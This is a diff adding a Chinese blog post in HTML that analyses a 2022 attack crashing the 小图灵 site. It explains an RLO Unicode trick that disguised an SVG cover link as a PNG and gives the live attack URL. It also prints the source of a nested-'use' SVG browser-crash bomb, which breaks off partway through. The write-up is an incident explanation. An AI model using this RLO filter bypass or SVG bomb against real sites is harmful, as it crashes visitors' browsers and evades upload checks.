@@ -1,0 +1,828 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="孙悟元"><meta name="copyright" content="孙悟元"><meta name="generator" content="Hexo 6.3.0"><meta name="theme" content="hexo-theme-yun"><title>2022,小图灵是这样崩的 | 孙悟元的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="icon" type="image/png" href="https://cdn.wuyuan.dev/img/wensiteicon.ico"><link rel="mask-icon" href="https://cdn.wuyuan.dev/img/wensiteicon.ico" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"wuyuan.dev","root":"/","title":"孙悟元的小站","version":"1.10.9","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]},"waline":{"config":{"enable":true,"serverURL":"https://blog-waline-service.wuyuan.dev/","comment":true,"el":"#waline","lang":"zh-CN"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.blue-light_blue.min.css"><script src="https://code.getmdl.io/1.3.0/material.min.js"></script><script src="https://cdn.wuyuan.dev/js/iframeResizer.contentWindow.min.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-91PD6T5RP9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-91PD6T5RP9');
+}</script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><meta name="description" content="事件2022年7月31日8:23分，我由 秦氏工作室室长john处得到了冰梨新的攻击这件事，可惜当时我用不了电脑，在工作室群中讨论后也没有结果。 起初我们认为是svg攻击，通过超大的svg图片崩掉网站，但是这次冰梨选择直接使网站崩溃而不是跳转，小图灵客户端尝试失败（小图灵客户端的webview比浏览器还差。。。。。） 随后，（疑似qqcd，秦氏工作室室长john说的）在小图灵刷了大量作品，将冰梨的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2022,小图灵是这样崩的">
+<meta property="og:url" content="http://wuyuan.dev/2022/08/01/xiaotulingsvg/index.html">
+<meta property="og:site_name" content="孙悟元的小站">
+<meta property="og:description" content="事件2022年7月31日8:23分，我由 秦氏工作室室长john处得到了冰梨新的攻击这件事，可惜当时我用不了电脑，在工作室群中讨论后也没有结果。 起初我们认为是svg攻击，通过超大的svg图片崩掉网站，但是这次冰梨选择直接使网站崩溃而不是跳转，小图灵客户端尝试失败（小图灵客户端的webview比浏览器还差。。。。。） 随后，（疑似qqcd，秦氏工作室室长john说的）在小图灵刷了大量作品，将冰梨的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.wuyuan.dev/img/eSearch-2022-08-01-14-20-12-349.png">
+<meta property="article:published_time" content="2022-08-01T14:28:47.000Z">
+<meta property="article:modified_time" content="2022-10-04T09:18:53.000Z">
+<meta property="article:author" content="孙悟元">
+<meta property="article:tag" content="小图灵">
+<meta property="article:tag" content="技术">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.wuyuan.dev/img/eSearch-2022-08-01-14-20-12-349.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="孙悟元"><img width="96" loading="lazy" src="https://cdn.wuyuan.dev/sitelogo.png" alt="孙悟元"><span class="site-author-status" title="不想上学">😭</span></a><div class="site-author-name"><a href="/about/">孙悟元</a></div><span class="site-name">孙悟元的小站</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">8</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">4</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">10</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://space.bilibili.com/661404066" title="bilibili"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:bilibili-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/sunwuyuan" title="GitHub" target="_blank" style="color:#181717"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:sun@wuyuan.dev" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://weibo.com/wuyuankeji" title="微博" target="_blank" style="color:#E6162D"><span class="icon iconify" data-icon="ri:weibo-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.zhihu.com/people/sunwuyuan" title="知乎" target="_blank" style="color:#0084FF"><span class="icon iconify" data-icon="ri:zhihu-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://space.bilibili.com/661404066" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><span class="icon iconify" data-icon="ri:bilibili-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8B%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text">事件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E6%98%AFunicode%E6%83%B9%E7%9A%84%E7%A5%B8"><span class="toc-number">3.</span> <span class="toc-text">全是unicode惹的祸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E5%BC%A0svg%E5%A6%82%E4%BD%95%E8%AE%A9%E6%B5%8F%E8%A7%88%E5%99%A8%E5%B4%A9%E6%BA%83%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text">一张svg如何让浏览器崩溃的???</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%B0%8F%E5%9B%BE%E7%81%B5%E7%9A%84%E8%AF%9D"><span class="toc-number">5.</span> <span class="toc-text">对小图灵的话</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://wuyuan.dev/2022/08/01/xiaotulingsvg/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="孙悟元"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="孙悟元的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">2022,小图灵是这样崩的</h1><div class="post-meta"><div class="post-time"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2022-08-01 14:28:47" itemprop="dateCreated datePublished" datetime="2022-08-01T14:28:47+00:00">2022-08-01</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2022-10-04 09:18:53" itemprop="dateModified" datetime="2022-10-04T09:18:53+00:00">2022-10-04</time></div><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="评论数"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2022/08/01/xiaotulingsvg/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%B0%8F%E5%9B%BE%E7%81%B5/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">小图灵</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/%E5%B0%8F%E5%9B%BE%E7%81%B5/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">小图灵</span></a><a class="tag-item" href="/tags/%E6%8A%80%E6%9C%AF/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">技术</span></a></span></div><div class="post-author"><span class="author-name">孙悟元</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>2022年7月31日8:23分，我由 <em><strong>秦氏工作室室长john</strong></em>处得到了冰梨新的攻击这件事，可惜当时我用不了电脑，在工作室群中讨论后也没有结果。</p>
+<p>起初我们认为是svg攻击，通过超大的svg图片崩掉网站，但是这次冰梨选择直接使网站崩溃而不是跳转，小图灵客户端尝试失败（小图灵客户端的<code>webview</code>比浏览器还差。。。。。）</p>
+<p>随后，（疑似<strong>qqcd</strong>，<em><strong>秦氏工作室室长john</strong></em>说的）在小图灵刷了大量作品，将冰梨的作品刷到了后面，小图灵网站对于作品页面是分页加载的（网站后加<code>?page=</code>），所以刷下去不加载即可暂时解决</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>小图灵的作品封面是一张图片，这张图片是由用户端发往小图灵服务器的数据包（post请求）传输的，传输前客户端发送数据包<code>single</code>到服务器，传输token(存储为cookies)进行鉴权，服务器确认，客户端发送作品到服务器(post数据包，名称为submit(提交)),其中<code>body</code>中的<code>thumbnail</code>就是封面的链接，此时在鉴权失效前编辑并重发就可以修改作品封面.</p>
+<p>但是，小图灵的作品封面是不允许svg的，所有svg封面会在服务端改为python的封面。</p>
+<p>那么，冰梨是如何进行svg攻击的呢？</p>
+<h2 id="全是unicode惹的祸"><a href="#全是unicode惹的祸" class="headerlink" title="全是unicode惹的祸"></a>全是unicode惹的祸</h2><blockquote>
+<p>统一码（Unicode），也叫万国码、单一码，是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。</p>
+</blockquote>
+<p>而unicode中有一些控制字符</p>
+<p>比如<code>RLO控制字符</code>是一个不可见字符，可以对文件名进行伪装。</p>
+<blockquote>
+<p>ROL控制字符是一段代码:_&amp;nbsp。ROL“ROLStartofright-to-leftoverride”,即文字从右往左排列</p>
+</blockquote>
+<p>说白了就是这个字符后面的文字反过来，比如<code>tab.jpg</code>加上RLO控制字符后变成<code>gpj.bat</code></p>
+<blockquote>
+<p>这个东西可以在vscode里会被高亮,大概是这样的：</p>
+<table><tr><td bgcolor=red>[U+202E]</td></tr></table>
+</blockquote>
+<p>而这次攻击的链接是<code>https://steam.nosdn.127.net/gnp.83c36d806dc92327b9e7049a565c.svg?</code>(不要打开！！！)</p>
+<p>而RLO控制字符在这里：</p>
+<p><img src="https://cdn.wuyuan.dev/img/eSearch-2022-08-01-14-20-12-349.png" alt="标红的地方" loading="lazy"><em>标红的地方</em></p>
+<p>此时，小图灵服务器会认为这个链接是<br><code>https://steam.nosdn.127.net/?gvs.c565a9407e9b72329cd608d63c38.png</code><br>是一个png图片，没有问题，所以可以正常展示<br>然而小图灵网站其他地方是有使用到svg的，有svg的声明。所以，这张图片就会被浏览器请求，然后……</p>
+<h2 id="一张svg如何让浏览器崩溃的"><a href="#一张svg如何让浏览器崩溃的" class="headerlink" title="一张svg如何让浏览器崩溃的???"></a>一张svg如何让浏览器崩溃的???</h2><details>
+  <summary>先来看看这张图的源代码</summary>
+
+<pre class="language-none"><code class="language-none">&lt;\svg xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2000&#x2F;svg&quot; xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot;&gt;
+    &lt;\g id&#x3D;&quot;lol0&quot;&gt;
+        &lt;\defs&gt;
+            &lt;\text font-size&#x3D;&quot;20&quot;&gt;12345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890&lt;\&#x2F;text&gt;
+        &lt;\&#x2F;defs&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol1&quot;&gt;
+        &lt;\use x&#x3D;&quot;78.09363499655643&quot; y&#x3D;&quot;24.327484961976232&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;51.891418834629974&quot; y&#x3D;&quot;8.137369773228976&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;41.201408340382514&quot; y&#x3D;&quot;10.854749822793941&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;93.0781644579808&quot; y&#x3D;&quot;36.801808266715796&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;73.15447014379643&quot; y&#x3D;&quot;96.52250447825514&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;6.207750798856749&quot; y&#x3D;&quot;98.87405924444037&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;28.597941847731967&quot; y&#x3D;&quot;52.59766161893038&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.69211910330735&quot; y&#x3D;&quot;10.895653004419959&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;97.95407114497465&quot; y&#x3D;&quot;76.20637866080725&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;93.6354064740894&quot; y&#x3D;&quot;25.55345565017999&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.47856906730413&quot; y&#x3D;&quot;66.69715614395454&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.782828301580607&quot; y&#x3D;&quot;27.655573952108405&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;95.44414073543484&quot; y&#x3D;&quot;94.20796217073065&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;46.11738511708954&quot; y&#x3D;&quot;28.06285768477568&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;69.67131293190819&quot; y&#x3D;&quot;74.09383647604025&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;43.597619895966446&quot; y&#x3D;&quot;86.46460675648277&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;0.21843426269039234&quot; y&#x3D;&quot;51.772033626851176&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;3.7645193828118373&quot; y&#x3D;&quot;78.11312177656889&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;58.83356183055475&quot; y&#x3D;&quot;6.182106340274663&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;47.28278204542452&quot; y&#x3D;&quot;10.625530649620696&quot; xlink:href&#x3D;&quot;#lol0&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol2&quot;&gt;
+        &lt;\use x&#x3D;&quot;97.9324327091232&quot; y&#x3D;&quot;54.83376622094174&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;3.738320295248365&quot; y&#x3D;&quot;69.47283335930551&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;44.087911441758465&quot; y&#x3D;&quot;18.80549333822187&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;33.16825690877744&quot; y&#x3D;&quot;72.5716773293719&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;43.07978141186515&quot; y&#x3D;&quot;66.34781762108612&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;85.0982475240899&quot; y&#x3D;&quot;14.597086100027179&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;92.58767387504197&quot; y&#x3D;&quot;21.299705638483026&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;35.75505515422894&quot; y&#x3D;&quot;70.3116195122051&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;89.1363196452551&quot; y&#x3D;&quot;5.648426385462169&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;63.0762257533367&quot; y&#x3D;&quot;37.698921977699975&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.75876293105387&quot; y&#x3D;&quot;50.72271356683231&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;40.635803807629266&quot; y&#x3D;&quot;35.86206578455818&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;66.75457922378149&quot; y&#x3D;&quot;18.546998413933203&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;42.2968511450549&quot; y&#x3D;&quot;82.85217736745271&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;6.25550233788058&quot; y&#x3D;&quot;49.6495044098942&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;84.03619203891257&quot; y&#x3D;&quot;11.578866310899627&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;94.46315850246224&quot; y&#x3D;&quot;77.40031883812765&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;90.7122309892825&quot; y&#x3D;&quot;70.40619320916983&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.510624671020246&quot; y&#x3D;&quot;37.05335979385435&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;77.94554743942004&quot; y&#x3D;&quot;56.1183304352336&quot; xlink:href&#x3D;&quot;#lol1&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol3&quot;&gt;
+        &lt;\use x&#x3D;&quot;12.497445185279465&quot; y&#x3D;&quot;41.37839237856834&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;99.05910964828088&quot; y&#x3D;&quot;57.337071608195465&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;88.22859841562324&quot; y&#x3D;&quot;47.127448488527875&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;30.877406329844348&quot; y&#x3D;&quot;44.524049688148594&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;35.16250057344893&quot; y&#x3D;&quot;95.28592323835075&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;80.48668959165275&quot; y&#x3D;&quot;18.229749592763255&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;76.13413921390813&quot; y&#x3D;&quot;65.60058808911259&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;27.14188233324809&quot; y&#x3D;&quot;27.77042641902323&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;19.954273061489335&quot; y&#x3D;&quot;14.960074165992909&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;8.018525526134557&quot; y&#x3D;&quot;77.26242900710027&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.85406275796525&quot; y&#x3D;&quot;69.81818075220887&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;49.224947029284216&quot; y&#x3D;&quot;13.083008058419809&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;74.78641485223207&quot; y&#x3D;&quot;85.31608565826086&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;81.44606792321385&quot; y&#x3D;&quot;59.647427501785465&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;87.48202747273409&quot; y&#x3D;&quot;79.7665926490859&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;72.85248290616765&quot; y&#x3D;&quot;16.038465950354073&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;3.5744638229881165&quot; y&#x3D;&quot;62.062262003624845&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;10.027499710047483&quot; y&#x3D;&quot;11.22219902582814&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;20.163910069785928&quot; y&#x3D;&quot;3.696691930176199&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;38.81482177652826&quot; y&#x3D;&quot;60.75774835001674&quot; xlink:href&#x3D;&quot;#lol2&quot; &#x2F;&gt;
+    &lt;\&#x2F;g&gt;
+    &lt;\g id&#x3D;&quot;lol4&quot;&gt;
+        &lt;\use x&#x3D;&quot;11.39696319976158&quot; y&#x3D;&quot;56.426469539125165&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;37.67222779516325&quot; y&#x3D;&quot;42.21509259526742&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;60.476315915912224&quot; y&#x3D;&quot;72.5487199542659&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;32.728208510534174&quot; y&#x3D;&quot;37.015886491604114&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;79.41666275332567&quot; y&#x3D;&quot;56.87414164862283&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;41.872585254356245&quot; y&#x3D;&quot;62.45534859660701&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;41.72464996841475&quot; y&#x3D;&quot;46.24660388075566&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.49594648352628&quot; y&#x3D;&quot;98.77768967199809&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;91.0986636890424&quot; y&#x3D;&quot;51.00318789186553&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;22.860672904063982&quot; y&#x3D;&quot;12.679137684515606&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;24.90549569973285&quot; y&#x3D;&quot;49.02606679237748&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
+        &lt;\use x&#x3D;&quot;9.438080232389733&quot; y&#x3D;&quot;97.16191668749433&quot; xlink:href&#x3D;&quot;#lol3&quot; &#x2F;&gt;
